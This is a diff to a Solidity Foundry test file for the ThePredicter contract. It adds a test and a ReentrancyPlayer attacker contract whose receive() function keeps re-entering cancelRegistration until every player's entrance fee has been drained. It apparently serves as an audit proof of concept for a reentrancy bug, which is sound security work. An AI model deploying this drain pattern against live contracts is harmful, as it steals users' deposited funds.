@@ -34,6 +34,16 @@ contract ThePredicterTest is Test {
         vm.stopPrank();
     }
 
+    modifier playersRegistered() {
+        hoax(makeAddr("stranger1"));
+        thePredicter.register{value: 0.04 ether}();
+        hoax(makeAddr("stranger2"));
+        thePredicter.register{value: 0.04 ether}();
+        hoax(makeAddr("stranger3"));
+        thePredicter.register{value: 0.04 ether}();
+        _;
+    }
+
     function test_registration() public {
         vm.startPrank(stranger);
         vm.deal(stranger, 1 ether);
@@ -683,5 +693,34 @@ contract ThePredicterTest is Test {
         assertEq(stranger3.balance, 1.0397 ether);
 
         assertEq(address(thePredicter).balance, 0 ether);
+    }
+
+    function testReenterCancelRegistration() public playersRegistered {
+        ReentrancyPlayer attacker = new ReentrancyPlayer(thePredicter);
+        vm.deal(address(attacker), thePredicter.entranceFee());
+        // Register and reenter cancelRegistration
+        attacker.registerAndCancel();
+        assertEq(address(thePredicter).balance, 0);
+        // The ReentrancyPlayer should have the entrance fee of all four players
+        assertEq(address(attacker).balance, 4*thePredicter.entranceFee());
+    }
+}
+
+contract ReentrancyPlayer {
+    ThePredicter public thePredicter;
+
+    constructor(ThePredicter _thePredicter) {
+        thePredicter = _thePredicter;
+    }
+
+    function registerAndCancel() public {
+        thePredicter.register{value: 0.04 ether}();
+        thePredicter.cancelRegistration();
+    }
+
+    receive() external payable {
+        if (address(thePredicter).balance >= thePredicter.entranceFee()) {
+            thePredicter.cancelRegistration();
+        }
     }
 }
